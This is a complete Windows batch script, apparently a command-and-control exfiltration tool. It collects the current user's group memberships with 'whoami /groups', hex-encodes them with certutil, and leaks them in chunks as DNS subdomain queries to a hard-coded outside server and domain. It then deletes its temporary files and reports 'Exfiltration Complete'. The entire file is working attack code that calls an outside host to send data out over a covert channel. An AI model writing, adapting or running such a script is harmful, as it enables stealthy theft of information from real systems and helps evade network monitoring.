@echo off
setlocal EnableDelayedExpansion

:: --- CONFIG ---
set "SERVER=134.199.229.158"
set "DOMAIN_SUFFIX=happydns.info"
set "TMPFILE=%TEMP%\c2_final_%RANDOM%"

:: 1. Collect and Encode
whoami /groups > "%TMPFILE%.txt"
:: We use Format 12 to get a continuous hex string if possible
certutil -f -encodehex "%TMPFILE%.txt" "%TMPFILE%.hex" 12 >nul

:: 2. Read and Scrub into one single string (FULLHEX)
set "FULLHEX="
for /f "usebackq delims=" %%A in ("%TMPFILE%.hex") do (
    set "RAW=%%A"
    set "CLEAN=!RAW: =!"
    set "CLEAN=!CLEAN:	=!"
    set "FULLHEX=!FULLHEX!!CLEAN!"
)

:: 3. Enforce Byte Alignment on the whole string
set "T=!FULLHEX!"
set "HEX_LEN=0"
:get_total_len
if not "!T:~%HEX_LEN%,1!"=="" (set /a HEX_LEN+=1 & goto get_total_len)

set /a "PARITY=HEX_LEN %% 2"
if !PARITY! NEQ 0 (
    set "FULLHEX=0!FULLHEX!"
    set /a HEX_LEN+=1
)

echo [*] Total Hex Length: !HEX_LEN! chars. Starting transfer...

:: 4. Data Transfer Loop (Position Based)
set "POS=0"
set "SEQ=1"
set "CHUNK_SIZE=40"

:send_loop
:: Extract 40 chars
set "DATA=!FULLHEX:~%POS%,%CHUNK_SIZE%!"
if "!DATA!"=="" goto send_done

:: Calculate if this is the end
set /a NEXT_POS=POS + CHUNK_SIZE
set "IS_END=0"
if !NEXT_POS! GEQ !HEX_LEN! set "IS_END=1"

:: Padding check (just in case the very last chunk is short)
set "TEMP_D=!DATA!"
set "L=0"
:sub_len
if not "!TEMP_D:~%L%,1!"=="" (set /a L+=1 & goto sub_len)
if !L! LSS 40 (
    :pad_inner
    set "DATA=!DATA!0"
    set /a L+=1
    if !L! LSS 40 goto pad_inner
)

:: Format Sequence
set "SEQ4=0000!SEQ!"
set "SEQ4=!SEQ4:~-4!"

echo [Chunk !SEQ4!] Sending !L! chars... (End: !IS_END!)
nslookup -retry=1 -timeout=2 "d!DATA!.i!SEQ4!.e!IS_END!.!DOMAIN_SUFFIX!" "!SERVER!" >nul 2>&1

:: Move pointer and increment sequence
set /a POS+=CHUNK_SIZE
set /a SEQ+=1

:: Small delay to prevent network congestion
timeout /t 1 >nul
goto send_loop

:send_done
:: Optional: Send an explicit DONE packet if your server requires a specific keyword
nslookup -retry=1 -timeout=2 "xdone.i9999.e1.!DOMAIN_SUFFIX!" "!SERVER!" >nul 2>&1

:: Cleanup
del "%TMPFILE%.txt" "%TMPFILE%.hex" >nul 2>&1
echo [+] Exfiltration Complete.
exit /b 0